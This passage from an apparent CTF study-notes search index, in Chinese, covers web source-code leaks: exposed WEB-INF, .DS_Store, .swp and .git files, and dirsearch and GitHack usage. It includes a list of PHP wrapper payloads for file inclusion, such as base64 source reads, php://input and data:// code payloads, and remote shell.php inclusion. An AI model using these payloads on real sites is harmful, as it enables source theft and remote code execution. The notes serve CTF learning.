<p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a\u5fa1\u5251</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#7web-infwebxml","title":"7\u3001<code>WEB-INF/web.xml</code>\u6cc4\u9732","text":"<p><code>WEB-INF</code>\u662fJava\u7684WEB\u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0c\u5982\u679c\u60f3\u5728\u9875\u9762\u4e2d\u76f4\u63a5\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\uff0c\u5fc5\u987b\u901a\u8fc7web.xml\u6587\u4ef6\u5bf9\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u8fdb\u884c\u76f8\u5e94\u6620\u5c04\u624d\u80fd\u8bbf\u95ee\u3002</p> <p><code>WEB-INF</code>\u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a</p> <p><pre><code>WEB-INF/web.xml : Web\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6, \u63cf\u8ff0\u4e86servlet\u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219.\nWEB-INF/database.properties : \u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\nWEB-INF/classes/ : \u4e00\u822c\u7528\u6765\u5b58\u653eJava\u7c7b\u6587\u4ef6(.class)\nWEB-INF/lib/ : \u7528\u6765\u5b58\u653e\u6253\u5305\u597d\u7684\u5e93(.jar)\nWEB-INF/src/ : \u7528\u6765\u653e\u6e90\u4ee3\u7801(.asp\u548c.php\u7b49)\n</code></pre> \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#8ds_store","title":"8\u3001DS_Store \u6587\u4ef6\u6cc4\u9732","text":"<p>.DS_Store\u662fMac\u4e0bFinder\u7528\u6765\u4fdd\u5b58\u5982\u4f55\u5c55\u793a \u6587\u4ef6/\u6587\u4ef6\u5939 \u7684\u6570\u636e\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u5bf9\u5e94\u4e00\u4e2a\u3002\u5982\u679c\u5c06.DS_Store\u4e0a\u4f20\u90e8\u7f72\u5230\u670d\u52a1\u5668\uff0c\u53ef\u80fd\u9020\u6210\u6587\u4ef6\u76ee\u5f55\u7ed3\u6784\u6cc4\u6f0f\uff0c\u7279\u522b\u662f\u5907\u4efd\u6587\u4ef6\u3001\u6e90\u4ee3\u7801\u6587\u4ef6\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/lijiejie/ds_store_exp</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n</code></pre>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#9swp","title":"9\u3001SWP \u6587\u4ef6\u6cc4\u9732","text":"<p>swp\u5373swap\u6587\u4ef6\uff0c\u5728\u7f16\u8f91\u6587\u4ef6\u65f6\u4ea7\u751f\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u5b83\u662f\u9690\u85cf\u6587\u4ef6\uff0c\u5982\u679c\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\uff0c\u4e34\u65f6\u6587\u4ef6\u81ea\u52a8\u5220\u9664\uff0c\u5982\u679c\u610f\u5916\u9000\u51fa\u5c31\u4f1a\u4fdd\u7559\uff0c\u6587\u4ef6\u540d\u4e3a .filename.swp\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a\u76f4\u63a5\u8bbf\u95ee.swp\u6587\u4ef6\uff0c\u4e0b\u8f7d\u56de\u6765\u540e\u5220\u6389\u672b\u5c3e\u7684.swp\uff0c\u83b7\u5f97\u6e90\u7801\u6587\u4ef6\u3002</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#10github","title":"10\u3001GitHub\u6e90\u7801\u6cc4\u6f0f","text":"<p>GitHub\u662f\u4e00\u4e2a\u9762\u5411\u5f00\u6e90\u53ca\u79c1\u6709\u8f6f\u4ef6\u9879\u76ee\u7684\u6258\u7ba1\u5e73\u53f0\u3002\u5f88\u591a\u4eba\u559c\u6b22\u628a\u81ea\u5df1\u7684\u4ee3\u7801\u4e0a\u4f20\u5230\u5e73\u53f0\u6258\u7ba1\uff0c\u901a\u8fc7\u5173\u952e\u8bcd\u8fdb\u884c\u641c\u7d22\uff0c\u53ef\u4ee5\u627e\u5230\u5173\u4e8e\u76ee\u6807\u7ad9\u70b9\u7684\u654f\u611f\u4fe1\u606f\uff0c\u751a\u81f3\u53ef\u4ee5\u4e0b\u8f7d\u7f51\u7ad9\u6e90\u7801\u3002</p> <p>\u7c7b\u4f3c\u7684\u4ee3\u7801\u6258\u7ba1\u5e73\u53f0\u8fd8\u6709\u5f88\u591a\uff0c\u4eba\u624d\u662f\u6700\u5927\u7684\u6f0f\u6d1e\u3002</p> <p><pre><code>https://github.com/search?q=smtp+user+@qq.com&amp;type=code\n</code></pre> \u53c2\u8003\u94fe\u63a5\uff1a https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_19</p> <p>https://evilpan.com/2017/09/22/web-file-disclosure/</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/","title":"\u6e90\u7801\u6cc4\u9732","text":"<p>\u5f88\u5c11\u5f88\u5c11\u4f1a\u78b0\u5230flag\u653e\u5728\u6cc4\u9732\u51fa\u6765\u7684\u6e90\u7801\u91cc\u9762</p> <p>\u4e00\u822c\u90fd\u662f\u4ee3\u7801\u5ba1\u8ba1\uff0c\u6240\u4ee5\u4f1a\u548c\u5176\u4ed6\u5f88\u591a\u4e1c\u897f\u4ea4\u7ec7\u5728\u4e00\u8d77\uff0c\u5c5e\u4e8e\u4e00\u4e2a\u6bd4\u8f83\u4e2d\u95f4\u7684\u6a21\u5757\u3002</p> <p>\u6240\u4ee5\u8fd9\u91cc\u5e94\u8be5\u662f\u4e0d\u4f1a\u6709\u4ec0\u4e48\u4f8b\u5b50\u3002</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#dirsearch","title":"dirsearch","text":"<p>\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u8f6f\u4ef6\u7684\u540d\u79f0\uff0c\u7528\u6765\u626b\u540e\u53f0\u8def\u5f84\u7684\uff0c\u8bb2\u4e0d\u597d\u53ef\u4ee5\u626b\u51fa\u6e90\u7801\u3002</p> <p>\u5fa1\u5251\u6211\u6ca1\u7528\u8fc7hhh</p> <p>\uff08\u4f46\u662fbuu\u6709\u8bbf\u95ee\u9650\u5236\u4f1a\u7ecf\u5e38429.......\u6240\u4ee5\u8bb0\u5f97\u52a0\u53c2\u6570\uff09</p> <p>\u653e\u4e0a\u4e0b\u8f7d\u94fe\u63a5</p> <p>https://github.com/maurosoria/dirsearch</p> <p>git clone\u4e0b\u8f7d\u5c31\u80fd\u7528\u4e86\u8bb0\u5f97chmod +x</p> <p>\u7136\u540e\u7528\u6cd5\u4e00\u822c\u662f</p> <p>./dirsearch -u URL -x 404,429,500...(\u770b\u9700\u6c42) -t 5(\u7ebf\u7a0b\u6570) -d 0.1(\u8bbf\u95ee\u5ef6\u8fdf)</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#git","title":".git\u6e90\u7801\u6cc4\u9732","text":"<p>\u5f00\u53d1\u4eba\u5458\u4f1a\u4f7f\u7528 git \u8fdb\u884c\u7248\u672c\u63a7\u5236\uff0c\u5bf9\u7ad9\u70b9\u81ea\u52a8\u90e8\u7f72\u3002\u4f46\u5982\u679c\u914d\u7f6e\u4e0d\u5f53\uff0c\u53ef\u80fd\u4f1a\u5c06 .git \u6587\u4ef6\u5939\u76f4\u63a5\u90e8\u7f72\u5230\u7ebf\u4e0a\u73af\u5883\uff0c\u8fd9\u5c31\u5f15\u8d77\u4e86 git \u6cc4\u9732\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u76f4\u63a5\u83b7\u5f97\u7f51\u9875\u6e90\u7801\u3002</p> <p>\u901a\u8fc7\u7f51\u9875\u8bbf\u95ee .git \u76ee\u5f55\uff0c\u5982\u679c\u80fd\u8bbf\u95ee\u5c31\u8bf4\u660e\u5b58\u5728\uff08\u6743\u9650\u4e0d\u591f\u4e5f\u884c\uff09</p> <p>\u8981\u83b7\u53d6\u6cc4\u9732\u7684\u6e90\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528 GitHack \u5de5\u5177</p> <p>python\uff082\uff09 GitHack.py url</p> <p>\u4e0b\u8f7d\u5b8c\u4e4b\u540e\u7684\u5de5\u4f5c\u57fa\u672c\u4e0a\u662f\u4ee3\u7801\u5ba1\u8ba1\u3002</p> <p>https://github.com/BugScanTeam/GitHack</p> <p>\u9700\u8981\u6ce8\u610f\u7684\uff0c\u8c8c\u4f3c\u6211\u89c1\u8fc7\u7684\u90fd\u662fpy2\u5199\u7684\uff0c\u6240\u4ee5\u9700\u8981py2\u8c03\u7528</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#git_1","title":"git\u6587\u4ef6\u4fee\u590d","text":"<p><code>git log --all</code></p> <p>\u4e00\u4e2a\u662f\u663e\u793a</p> <p><code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code></p> <p>\u4e00\u4e2a\u662f\u6062\u590d</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#ds_store","title":"ds_store","text":"<p>\u5728Mac OS\u4e0a\u4f1a\u5b58\u5728\u3002</p> <p>DS_Store \u662f\u7528\u6765\u5b58\u50a8\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u663e\u793a\u5c5e\u6027\u7684\uff1a\u6bd4\u5982\u6587\u4ef6\u56fe\u6807\u7684\u6446\u653e\u4f4d\u7f6e\u3002\u5220\u9664\u4ee5\u540e\u7684\u526f\u4f5c\u7528\u5c31\u662f\u8fd9\u4e9b\u4fe1\u606f\u7684\u5931\u53bb\u3002\uff08\u5f53\u7136\uff0c\u8fd9\u70b9\u526f\u4f5c\u7528\u5176\u5b9e\u4e0d\u662f\u592a\u5927\uff09</p> <p>\u4e3b\u8981\u662f\u5982\u679c\u62ff\u5230\u4e86\u8fd9\u4e2a\u6587\u4ef6\u7531\u4e8e\u5404\u79cd\u7f16\u7801\u7684\u539f\u56e0\u4f1a\u5f88\u96be\u53d7</p> <p>\u4e8e\u662f\u7ed9\u51fa\u4e00\u4e2a\u89e3\u6790\u8bfb\u53d6\u8fd9\u7c7b\u6587\u4ef6\u7684\u811a\u672c\uff1a</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#php","title":"php\u4f2a\u534f\u8bae","text":"<p>\u5176\u5b9e\u8fd9\u4e2a\u4e1c\u897f\u5e94\u8be5\u653e\u5728\u6587\u4ef6\u5305\u542b\u548c\u6587\u4ef6\u4e0a\u4f20\u91cc\u9762\u7684\u3002\u7ea0\u7ed3\u4e86\u4e00\u4e0b\uff0c\u4f46\u8fd8\u662f\uff0c\u51b3\u5b9a\u4e24\u4e2a\u5730\u65b9\u90fd\u653e\u7740(\u4e0d\u8fc7\u4e0d\u4f1a\u653e\u5f88\u591a\uff0c\u5927\u5934\u8fd8\u662f\u653e\u5728\u90a3\u8fb9)\uff1a</p> <p>include\u3001require\u3001include_once\u3001require_once\u3001highlight_file \u3001show_source \u3001readfile \u3001file_get_contents \u3001fopen \u3001file</p> <p>\u8fd9\u4e9b\u90fd\u662f\u5e38\u89c1\u7684\u6587\u4ef6\u5305\u542b\u51fd\u6570\u4f2a\u534f\u8bae\u4f9d\u6258\u4e8e\u8fd9\u4e9b\u51fd\u6570\u6765\u6267\u884c\u3002\u3002</p> <p>\u4ee5\u5e38\u89c1\u7684include\u4e3a\u4f8b\u597d\u4e86</p> <p>\u6700\u957f\u4f7f\u7528\u7684\u4e3aphp://filter/read=convert.base64-encode/resource=[\u6587\u4ef6\u540d]\u8bfb\u53d6\u6587\u4ef6\u6e90\u7801\uff08\u9488\u5bf9php\u6587\u4ef6\u9700\u8981base64\u7f16\u7801\uff09</p> <p>\u4f1a\u78b0\u5230include($_GET['NAME'])</p> <p>\u7136\u540e\u4f60\u4f20\u4e2a?NAME=php://filter/read=convert.base64-encode/resource=index.php</p> <p>\u8fdb\u53bb\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u62ff\u5230index.php\u7684base64\u7f16\u7801\u7684\u6e90\u7801\u3002</p> <p>\u539f\u7406\u5c31\u662f\u6587\u4ef6\u5305\u542b\uff08\u4e4b\u540e\u4ecb\u7ecd\uff09</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#php_1","title":"php\u652f\u6301\u7684\u4f2a\u534f\u8bae\u6709\uff1a","text":"<pre><code>ftp://shell.php\nfile:///tmp/shell.php\nhttp://xxxx/shell.php\n\\\\smbserver\\shell.php        //unc\u8def\u5f84\nphar://xxxx/x.zip/shell.php   //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nzip://xxxx/x.zip#shell.php    //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nphp://filter/read=convert.base64-encode/resource=shell.php\ncompress.bzip2://shell.php\ncompress.zlib://shell.jpg\nphp://input    [POST DATA] &lt;?php phpinfo()?&gt;\ndata://text/plain,&lt;?php phpinfo()?&gt;                 //\u4e5f\u53ef\u4ee5data:text/plain,&lt;?php phpinfo()?&gt;\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\nphp://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\nphp://filter/%72ead=convert.base64-encode/resource=shell.%70hp\n</code></pre> <p>\u8bfb\u6587\u4ef6\u5e38\u7528\u7684\u4e5f\u5c31php\uff1a\uff08\u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\uff09</p> <p>\u548cfile:\uff08\u8fd8\u6709local_file,\u8fd9\u4e2a\u4e4b\u540e\u518d\u8bf4\uff0c\u597d\u50cf\u662f\u4e2acve\uff09</p> <p>\u6240\u8c13\u7684\u4f2a\u534f\u8bae\uff0c\u4e8b\u5b9e\u4e0a\u662f\u5176\u652f\u6301\u7684\u534f\u8bae\u4e0e\u5c01\u88c5\u534f\u8bae</p>"},{"location":"web_bak/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#google","title":"google","text":"<p>\u6709\u4e9b\u4ee3\u7801\uff08\u6bd4\u5982\u8bf4\u76f4\u63a5\u7684\u670d\u52a1\u5668\u7aef\u6846\u67b6\u6027\u7684\uff09\u8bd5\u80fd\u591f\u76f4\u63a5\u7528github\u548cgoogle\u76f4\u63a5\u641c\u7d22\u5230\u7684</p> <p>\u56e0\u6b64\u8fd9\u4e5f\u662f\u4e00\u79cd\u5f62\u5f0f\u4e0a\u7684\u6e90\u7801\u6cc4\u9732\u3002</p>"}]}